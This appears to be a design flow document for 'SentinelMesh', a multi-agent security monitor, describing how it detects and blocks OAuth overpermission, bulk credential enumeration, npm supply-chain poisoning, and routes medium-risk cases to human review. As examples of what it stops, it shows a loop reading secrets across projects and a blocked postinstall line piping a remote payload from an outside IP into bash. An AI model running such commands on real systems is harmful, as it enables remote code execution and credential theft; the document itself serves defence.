# SentinelMesh — Flow Document

> Complete flows with real examples, timing, and decision logic

---

## Flow 1 — OAuth Attack Interception (Vercel Breach Pattern)

### Trigger
A third-party app (e.g., `context-ai-office-suite`) requests OAuth access to a user's Google account with Gmail + Drive + Calendar scopes.

### Step-by-Step Flow

```
╔══════════════════════════════════════════════════════════════════════╗
║                     OAUTH ATTACK FLOW                                ║
╚══════════════════════════════════════════════════════════════════════╝

USER CLICKS "Sign in with Google" on a third-party app
              │
              ▼
    ┌─────────────────────┐
    │  Chrome Extension   │   ← SentinelMesh integration
    │  intercepts OAuth   │     content_script on accounts.google.com
    │  consent screen URL │
    └──────────┬──────────┘
               │ Parses scopes from URL params
               │ Detects: gmail, drive, calendar
               ▼
    ┌─────────────────────────────────────────┐
    │  POST /api/v1/events                    │
    │  {                                      │
    │    attack_type: "OAUTH_OVERPERMISSION", │
    │    scopes: [gmail, drive, calendar],    │
    │    app: "context-ai-office-suite",      │
    │    timestamp: 1714000000               │
    │  }                                      │
    └──────────┬──────────────────────────────┘
               │ T+50ms
               ▼
    ┌─────────────────────┐
    │  FastAPI Backend    │   Saves event to SQLite
    │  /api/v1/events     │   Publishes to Redis: "sentinel:events"
    └──────────┬──────────┘
               │ T+60ms
               ▼ Redis pub/sub
    ┌─────────────────────┐
    │  DETECTOR AGENT     │
    │                     │   oauth_risk_scorer([gmail, drive, calendar])
    │  Gmail  = +40 pts   │   ───────────────────────────────────────
    │  Drive  = +30 pts   │   Total: 85/100
    │  Calendar = +15 pts │   Verdict: BLOCK (>70 threshold)
    │  ─────────────────  │
    │  Score: 85/100      │
    └──────────┬──────────┘
               │ T+200ms
               ▼
    ┌─────────────────────┐
    │  LISTENER AGENT     │
    │                     │   Cross-checks behavioral baseline:
    │  Time: 03:14 AM     │   ───────────────────────────────────
    │  Off-hours: YES     │   - Off-hours activity (+20 pts)
    │  New app: YES       │   - App never seen before (+20 pts)
    │  ─────────────────  │
    │  Anomaly Score: 60  │
    └──────────┬──────────┘
               │ T+250ms
               ▼
    ┌─────────────────────┐
    │  GATEKEEPER AGENT   │
    │                     │
    │  threat:  85        │   combined = max(85, 60) = 85
    │  anomaly: 60        │   85 > 70 threshold
    │  combined: 85       │   → DECISION: BLOCK + QUARANTINE
    │                     │
    │  Signs with ECDSA   │   signature: "3045022100abc..."
    └──────────┬──────────┘
               │ T+270ms
               ▼
    ┌─────────────────────┐
    │  SUPERVISOR AGENT   │
    │                     │   Generates IncidentCard:
    │  INC-1714000000     │   ───────────────────────
    │                     │   type: OAUTH_OVERPERMISSION
    │  ► Telegram sent    │   score: 85/100
    │  ► DB record saved  │   verdict: BLOCK
    │  ► WS broadcast     │   breach ref: Vercel April 2026
    └──────────┬──────────┘
               │ T+350ms
               ▼
    ┌─────────────────────┐
    │  ADMIN DASHBOARD    │   WebSocket pushes alert
    │  localhost:3000     │   
    │                     │   🔴 SENTINEL ALERT [CRITICAL]
    │  Alert card appears │   OAuth Grant Risk Score: 85/100
    │  in < 2 seconds     │   App: context-ai-office-suite
    │                     │   Verdict: BLOCKED
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────┐
    │  HUMAN ADMIN        │   Sees alert on phone (Telegram)
    │                     │   Reviews on dashboard
    │  Clicks [BLOCK]     │   Logs human decision to audit trail
    └─────────────────────┘

RESULT: OAuth grant never completes. Credentials never exposed.
TIME:   8 seconds total (vs 22 months for Vercel)
```

---

## Flow 2 — Credential Dump Detection (Bulk Enumeration)

### Trigger
A compromised session or malicious script begins reading environment variables across multiple projects at high speed.

### Step-by-Step Flow

```
╔══════════════════════════════════════════════════════════════════════╗
║               CREDENTIAL ENUMERATION FLOW                            ║
╚══════════════════════════════════════════════════════════════════════╝

ATTACKER (or compromised agent) runs:
  for project in projects:      ← 10 projects
    for var in secrets:         ← 5 secrets each
      read(f"{project}/{var}")  ← 50 reads in ~4 seconds
              │
              ▼
    ┌─────────────────────┐
    │  n8n / Docker       │
    │  Sidecar intercepts │   Each env var read triggers an event
    │  env reads          │
    └──────────┬──────────┘
               │ 50 events posted over 4 seconds
               ▼
    ┌─────────────────────┐
    │  LISTENER AGENT     │   Rolling window analysis (60 seconds):
    │                     │   ───────────────────────────────────────
    │  Baseline:          │   Reads seen:    50 in 4s = 750/min
    │    3 reads/min      │   Baseline:      3/min
    │    1 project        │   Anomaly:       250x above baseline
    │                     │
    │  Current:           │   Projects seen: 10
    │    750 reads/min    │   Baseline:      1 project
    │    10 projects      │   Cross-project: 10x anomaly
    │                     │
    │  anomaly_score: 95  │
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────┐
    │  GATEKEEPER         │   combined_score = 95 > 70
    │                     │   → BLOCK + QUARANTINE_SESSION
    │  Session token      │   Session invalidated
    │  invalidated        │   All further reads from this session denied
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────┐
    │  DASHBOARD ALERT    │
    │                     │   🔴 SENTINEL ALERT [CRITICAL]
    │  Rate: 750/min      │   Pattern: Bulk credential enumeration
    │  (250x anomaly)     │   Rate: 750 env reads/min (baseline: 3/min)
    │  10 projects        │   Scope: 10 projects, 50 unique secrets
    │  50 secrets         │   Timeline: Matches Vercel breach, 9 days prior
    └─────────────────────┘

RESULT: Session quarantined at read #1 (after velocity detected)
        Attacker gets 0 usable credentials
        Vercel equivalent: attack detected in ~5s vs 9 days post-facto
```

---

## Flow 3 — Supply Chain Package Poisoning (Axios Pattern)

### Trigger
A developer or CI/CD pipeline attempts to install an npm package with suspicious characteristics matching the Axios attack fingerprint.

### Step-by-Step Flow

```
╔══════════════════════════════════════════════════════════════════════╗
║               SUPPLY CHAIN POISONING FLOW                            ║
╚══════════════════════════════════════════════════════════════════════╝

CI/CD PIPELINE or developer runs:
  npm install plain-crypto-js@4.2.1
              │
              ▼
    ┌─────────────────────┐
    │  n8n Node /         │   SentinelMesh intercepts BEFORE install
    │  Docker Sidecar     │   Posts event to backend
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────────────────────────────────────┐
    │  DETECTOR AGENT — supply_chain_auditor()            │
    │                                                     │
    │  Checks npm registry for plain-crypto-js@4.2.1:    │
    │                                                     │
    │  ┌─────────────────────────────────────────────┐   │
    │  │ Signal Check            Result               │   │
    │  │ ─────────────────────────────────────────── │   │
    │  │ Maintainer account age  11 days → FLAG       │   │
    │  │ Weekly downloads        23 → FLAG (< 100)    │   │
    │  │ Time since published    18 hours → FLAG      │   │
    │  │ Postinstall script      EXISTS → FLAG        │   │
    │  └─────────────────────────────────────────────┘   │
    │                                                     │
    │  risk_signals: [NEW_MAINTAINER, LOW_ADOPTION,       │
    │                 FRESH_RELEASE, POSTINSTALL_SCRIPT]  │
    │                                                     │
    │  len(signals) = 4 >= threshold 2 → BLOCK_INSTALL   │
    │  score: 88/100                                      │
    └──────────┬──────────────────────────────────────────┘
               │
               ▼
    ┌─────────────────────┐
    │  GATEKEEPER         │   88 > 70 → BLOCK
    │                     │   npm install command never executes
    │  Postinstall:       │   curl http://185.220.x.x/payload.sh
    │  NEVER RUNS         │   | bash  ← this never fires
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────┐
    │  DASHBOARD ALERT    │   🟠 SENTINEL ALERT [HIGH]
    │                     │   Package: plain-crypto-js@4.2.1
    │  Shows postinstall  │   Risk: NEW_MAINTAINER, FRESH_RELEASE,
    │  script content     │         LOW_ADOPTION, POSTINSTALL_SCRIPT
    │  that was blocked   │   Postinstall: curl http://185.x.x/payload | bash
    │                     │   Reference: Axios March 2026 fingerprint
    └─────────────────────┘

RESULT: Malicious RAT payload never downloads
        CI/CD build fails safely with clear error message
        Admin sees exact postinstall script that would have run
```

---

## Flow 4 — Human Admin Review & Approval

### Trigger
A medium-risk action (score 30–70) is queued for human review.

### Step-by-Step Flow

```
GATEKEEPER verdict: score = 55 → QUEUE (human review required)
              │
              ▼
    ┌─────────────────────────────────────────────────────┐
    │  Admin Dashboard — /incidents                       │
    │                                                     │
    │  ┌─────────────────────────────────────────────┐   │
    │  │ 🟡 INC-1714000123     OAUTH_OVERPERMISSION  │   │
    │  │ Score: 55/100 ████████████░░░░░░░░░░       │   │
    │  │ Status: OPEN — Awaiting Review              │   │
    │  │                                             │   │
    │  │ Evidence:                                   │   │
    │  │ • Requested Drive read-only access (30pts)  │   │
    │  │ • Business hours (09:00 AM) (-10pts adj)    │   │
    │  │ • App: google-workspace-sync (known app)    │   │
    │  │                                             │   │
    │  │ Recommended: Review — may be legitimate     │   │
    │  │                                             │   │
    │  │  [✅ Approve]  [🚫 Block]  [🔍 Investigate] │   │
    │  └─────────────────────────────────────────────┘   │
    └──────────┬──────────────────────────────────────────┘
               │ Admin clicks [Approve]
               ▼
    ┌─────────────────────┐
    │  POST               │
    │  /api/v1/approve/   │   Backend updates incident status → APPROVED
    │  INC-1714000123     │   Writes to audit_trail with is_human_action=1
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────┐
    │  AUDIT TRAIL ENTRY  │
    │                     │   Timestamp: 2026-04-23 09:14:32
    │  Signed by:         │   Agent: HUMAN (admin@company.com)
    │  ECDSA key          │   Action: APPROVE
    │                     │   Target: INC-1714000123
    │  ✅ Tamper-proof    │   Verdict: APPROVED
    │                     │   Signature: 3045022100def...
    └─────────────────────┘

RESULT: OAuth grant proceeds. Human decision logged permanently.
        If later questioned — full audit chain available.
```

---

## Flow 5 — MCP Integration (Cursor IDE Flow)

### Trigger
Developer uses Cursor IDE with SentinelMesh MCP server configured.

### Step-by-Step Flow

```
DEVELOPER IN CURSOR asks Claude:
  "Should I install this package: unknown-crypto-utils@1.0.0?"
              │
              ▼
    ┌─────────────────────┐
    │  Claude (in Cursor) │   Recognizes this needs security check
    │  calls MCP tool:    │   
    │                     │   audit_package(
    │  sentinelmesh MCP   │     package="unknown-crypto-utils",
    │  server running     │     version="1.0.0"
    │  locally            │   )
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────┐
    │  MCP Server         │   Routes to supply_chain_auditor()
    │  mcp_server.py      │   Calls npm registry
    │                     │   Returns risk analysis
    └──────────┬──────────┘
               │
               ▼
    ┌─────────────────────────────────────────────────────┐
    │  Claude responds to developer:                      │
    │                                                     │
    │  "⚠️ SentinelMesh flagged this package:            │
    │   Risk Score: 72/100 — HIGH RISK                   │
    │                                                     │
    │   Risk signals detected:                            │
    │   • NEW_MAINTAINER (account age: 3 days)           │
    │   • FRESH_RELEASE (published: 6 hours ago)         │
    │   • LOW_ADOPTION (downloads: 12/week)              │
    │                                                     │
    │   Verdict: DO NOT INSTALL                          │
    │                                                     │
    │   Consider alternatives: crypto-js (18M downloads, │
    │   established maintainer)"                         │
    └─────────────────────────────────────────────────────┘

RESULT: Developer never runs npm install. Zero risk exposure.
        Security check happened inline in their workflow.
```

---

## Decision Tree — Gatekeeper Logic

```
                    EVENT RECEIVED
                         │
              ┌──────────▼──────────┐
              │  Compute Scores     │
              │  threat_score (0-100│
              │  anomaly_score(0-100│
              │  combined = max()   │
              └──────────┬──────────┘
                         │
              ┌──────────▼──────────┐
              │  combined_score > 70?│
              └──────────┬──────────┘
                    YES  │  NO
          ┌──────────────┘  └──────────────┐
          ▼                                ▼
 ┌────────────────┐             ┌──────────▼──────────┐
 │ 🚫 BLOCK       │             │ combined_score > 30? │
 │                │             └──────────┬──────────┘
 │ QUARANTINE     │                  YES   │  NO
 │ session/action │         ┌────────────  └────────────┐
 │                │         ▼                           ▼
 │ Sign verdict   │  ┌─────────────┐        ┌─────────────────┐
 │ Telegram alert │  │ ⚠️ QUEUE    │        │ ✅ ALLOW         │
 │ WS broadcast   │  │             │        │                  │
 └────────────────┘  │ Human review│        │ Log only         │
                     │ required    │        │ Audit trail entry│
                     │             │        │ No notification  │
                     │ Admin panel │        └─────────────────┘
                     │ incident    │
                     └─────────────┘
```

---

## Timing Reference

| Step | Target | What Happens |
|---|---|---|
| T+0ms | Event trigger | Integration intercepts action |
| T+50ms | Backend receives | FastAPI logs event, publishes to Redis |
| T+80ms | Detector picks up | Pulls from Redis channel |
| T+200ms | Threat scored | Gemini Flash inference completes |
| T+250ms | Anomaly checked | Listener cross-references baseline |
| T+270ms | Verdict made | Gatekeeper decides + signs |
| T+320ms | Incident created | Supervisor builds card |
| T+350ms | Telegram sent | Admin phone notified |
| T+400ms | WebSocket push | Dashboard receives alert |
| T+450ms | Alert visible | User sees red card on screen |
| T+3000ms | Human sees | Telegram delivers to phone |

**Total: ~2 seconds from attack to visible alert**  
**Comparison: Vercel breach — 22 months undetected**
